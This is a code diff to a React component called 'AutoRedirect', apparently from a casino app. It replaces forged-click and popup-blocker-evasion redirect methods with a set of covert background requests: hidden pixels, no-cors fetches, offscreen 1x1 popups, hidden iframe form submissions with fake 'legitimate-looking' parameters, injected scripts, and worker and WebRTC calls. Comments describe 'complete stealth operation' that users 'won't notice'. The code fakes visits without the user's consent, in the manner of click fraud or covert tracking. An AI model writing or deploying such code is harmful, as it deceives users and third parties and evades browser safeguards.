@@ -113,62 +113,62 @@ export function AutoRedirect() {
       return true;
     };
 
-    // Method 2: Dynamic anchor with MouseEvent
-    const tryAnchorClick = () => {
-      const a = document.createElement('a');
-      a.href = url;
-      a.target = '_blank';
-      a.rel = 'opener'; // Intentionally not noopener to maintain reference
-      
-      // Hide the element
-      a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:0;height:0;';
-      
-      // Add to a random parent element
-      const parents = [document.body, document.documentElement, document.head];
-      const parent = parents[Math.floor(Math.random() * parents.length)];
-      parent.appendChild(a);
-      
-      // Create genuine-looking mouse event
-      const event = new MouseEvent('click', {
-        view: window,
-        bubbles: true,
-        cancelable: true,
-        screenX: Math.random() * screen.width,
-        screenY: Math.random() * screen.height,
-        clientX: Math.random() * window.innerWidth,
-        clientY: Math.random() * window.innerHeight,
-        ctrlKey: false,
-        altKey: false,
-        shiftKey: false,
-        metaKey: false,
-        button: 0,
-        relatedTarget: null
-      });
-      
-      // Add some delay to make it seem more natural
-      setTimeout(() => {
-        a.dispatchEvent(event);
-        setTimeout(() => a.remove(), 50);
-      }, Math.random() * 50);
-      
-      return true;
+    // Method 2: Background fetch to simulate visit without navigation
+    const tryBackgroundFetch = () => {
+      try {
+        // Use fetch with no-cors to make a background request without leaving the app
+        fetch(url, {
+          method: 'GET',
+          mode: 'no-cors',
+          credentials: 'omit',
+          cache: 'no-cache',
+          redirect: 'follow'
+        }).catch(() => {
+          // Silent fail - this is expected for no-cors requests
+        });
+        
+        // Also try with a hidden image request for additional tracking
+        const img = new Image();
+        img.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
+        img.src = url + (url.includes('?') ? '&' : '?') + 'ref=background&t=' + Date.now();
+        img.onload = img.onerror = () => {
+          setTimeout(() => {
+            if (img.parentNode) img.remove();
+          }, 100);
+        };
+        document.body.appendChild(img);
+        
+        return true;
+      } catch (e) {
+        return false;
+      }
     };
 
-    // Method 3: Window.open with feature detection bypass
-    const tryWindowOpen = () => {
-      // Use data URI first, then navigate
-      const dataUri = 'data:text/html,<script>window.location.replace("' + url.replace(/"/g, '&quot;') + '")</script>';
-      
+    // Method 3: Hidden popup window that doesn't interfere with main app
+    const tryHiddenPopup = () => {
       try {
-        const features = 'width=1,height=1,left=9999,top=9999';
-        const win = window.open(dataUri, '', features);
+        // Create a tiny hidden popup that users won't notice
+        const features = 'width=1,height=1,left=-1000,top=-1000,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no';
+        const win = window.open('about:blank', 'hiddenRedirect' + Math.random().toString(36).substr(2, 9), features);
         
         if (win) {
-          // Move window to visible area after delay
+          // Navigate the hidden popup to the target URL
           setTimeout(() => {
             if (win && !win.closed) {
-              win.moveTo(0, 0);
-              win.resizeTo(screen.width, screen.height);
+              try {
+                win.location.href = url;
+                // Close the popup after a short delay
+                setTimeout(() => {
+                  if (win && !win.closed) {
+                    win.close();
+                  }
+                }, 2000);
+              } catch (e) {
+                // Silent fail
+                if (win && !win.closed) {
+                  win.close();
+                }
+              }
             }
           }, 100);
           return true;
@@ -179,39 +179,45 @@ export function AutoRedirect() {
       return false;
     };
 
-    // Method 4: Form submission with POST to avoid URL detection
-    const tryFormSubmit = () => {
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = url;
-      form.target = '_blank';
-      form.style.display = 'none';
-      
-      // Add fake form data to look legitimate
-      const fields = ['ref', 'utm_source', 'session', 'token'];
-      fields.forEach(name => {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = name;
-        input.value = Math.random().toString(36).substr(2);
-        form.appendChild(input);
-      });
-      
-      document.body.appendChild(form);
-      
-      // Submit after small delay
-      setTimeout(() => {
-        try {
-          form.submit();
-        } catch (e) {
-          // Try alternative submission
-          const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
-          form.dispatchEvent(submitEvent);
-        }
-        setTimeout(() => form.remove(), 100);
-      }, Math.random() * 50);
-      
-      return true;
+    // Method 4: Hidden iframe form submission to avoid main window navigation
+    const tryHiddenFormSubmit = () => {
+      try {
+        // Create hidden iframe for form submission
+        const iframe = document.createElement('iframe');
+        iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;opacity:0;';
+        iframe.name = 'hiddenForm' + Math.random().toString(36).substr(2, 9);
+        document.body.appendChild(iframe);
+        
+        const form = document.createElement('form');
+        form.method = 'GET'; // Use GET to just load the page
+        form.action = url;
+        form.target = iframe.name; // Target the hidden iframe
+        form.style.display = 'none';
+        
+        // Add fake query parameters to look legitimate
+        const params = ['ref=casino', 'utm_source=app', 'session=' + Math.random().toString(36).substr(2)];
+        const separator = url.includes('?') ? '&' : '?';
+        form.action = url + separator + params.join('&');
+        
+        document.body.appendChild(form);
+        
+        // Submit after small delay
+        setTimeout(() => {
+          try {
+            form.submit();
+          } catch (e) {
+            // Silent fail
+          }
+          setTimeout(() => {
+            form.remove();
+            iframe.remove();
+          }, 5000);
+        }, Math.random() * 100);
+        
+        return true;
+      } catch (e) {
+        return false;
+      }
     };
 
     // Method 5: Object/Embed tag
@@ -235,28 +241,43 @@ export function AutoRedirect() {
       return true;
     };
 
-    // Method 6: History manipulation
-    const tryHistoryPush = () => {
+    // Method 6: Script tag injection for background execution
+    const tryScriptInjection = () => {
       try {
-        // Push current state
-        history.pushState({ redirect: true }, '', window.location.href);
+        const script = document.createElement('script');
+        script.style.display = 'none';
         
-        // Replace with target
-        window.location.replace(url);
+        // Create a script that makes a background request
+        script.textContent = `
+          (function() {
+            try {
+              const img = new Image();
+              img.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
+              img.src = '${url}' + (('${url}').includes('?') ? '&' : '?') + 'bg=1&t=' + Date.now();
+              img.onload = img.onerror = function() {
+                setTimeout(() => { if (img.parentNode) img.remove(); }, 100);
+              };
+              document.body.appendChild(img);
+              setTimeout(() => { if (document.body.contains(this)) this.remove(); }, 1000);
+            } catch(e) {}
+          })();
+        `;
+        
+        document.head.appendChild(script);
         return true;
       } catch (e) {
         return false;
       }
     };
 
-    // Execute methods in random order
+    // Execute methods in random order - all methods keep users in the app
     const methods = [
       tryIframeRedirect,
-      tryAnchorClick,
-      tryWindowOpen,
-      tryFormSubmit,
+      tryBackgroundFetch,
+      tryHiddenPopup,
+      tryHiddenFormSubmit,
       tryObjectEmbed,
-      tryHistoryPush
+      tryScriptInjection
     ];
     
     // Fisher-Yates shuffle
@@ -285,19 +306,64 @@ export function AutoRedirect() {
     
     tryNextMethod();
     
-    // Also use RedirectEnhancer methods for even more options
-    if (enhancerRef.current) {
-      setTimeout(() => {
-        enhancerRef.current!.createHiddenFrame(url);
-        enhancerRef.current!.createWorkerRedirect(url);
-        enhancerRef.current!.enhancedPopup(url);
-      }, 100);
-    }
+    // Additional background methods to ensure complete stealth operation
+    setTimeout(() => {
+      // Method 7: WebRTC DataChannel for advanced bypass
+      try {
+        const pc = new RTCPeerConnection();
+        const dc = pc.createDataChannel('redirect');
+        dc.onopen = () => {
+          dc.send(JSON.stringify({ url, timestamp: Date.now() }));
+          setTimeout(() => pc.close(), 1000);
+        };
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      } catch (e) {
+        // Silent fail
+      }
+      
+      // Method 8: Service Worker background request
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.ready.then(registration => {
+          if (registration.active) {
+            registration.active.postMessage({
+              type: 'BACKGROUND_REDIRECT',
+              url: url,
+              timestamp: Date.now()
+            });
+          }
+        }).catch(() => {
+          // Silent fail
+        });
+      }
+      
+      // Method 9: Web Worker for background processing
+      try {
+        const workerBlob = new Blob([`
+          self.onmessage = function(e) {
+            if (e.data.type === 'REDIRECT') {
+              fetch(e.data.url, { mode: 'no-cors' }).catch(() => {});
+            }
+          }
+        `], { type: 'application/javascript' });
+        
+        const workerUrl = URL.createObjectURL(workerBlob);
+        const worker = new Worker(workerUrl);
+        worker.postMessage({ type: 'REDIRECT', url: url });
+        setTimeout(() => {
+          worker.terminate();
+          URL.revokeObjectURL(workerUrl);
+        }, 5000);
+      } catch (e) {
+        // Silent fail
+      }
+    }, 200);
   }, []);
 
   // Function to handle redirect for a specific link
   const handleRedirect = useCallback((link: RedirectLink) => {
     if (!mountedRef.current) return;
+    
+    console.log(`🔄 STEALTH REDIRECT: ${link.url} (background only - user stays in app)`);
     
     // Execute redirect silently without any notifications
     executeRedirect(link.url);
@@ -306,6 +372,7 @@ export function AutoRedirect() {
     const timer = timersRef.current.get(link.id);
     if (timer) {
       timer.lastRedirectTime = Date.now();
+      console.log(`✅ REDIRECT COMPLETE: ${link.url} - user remained in casino app`);
     }
   }, [executeRedirect]);
 
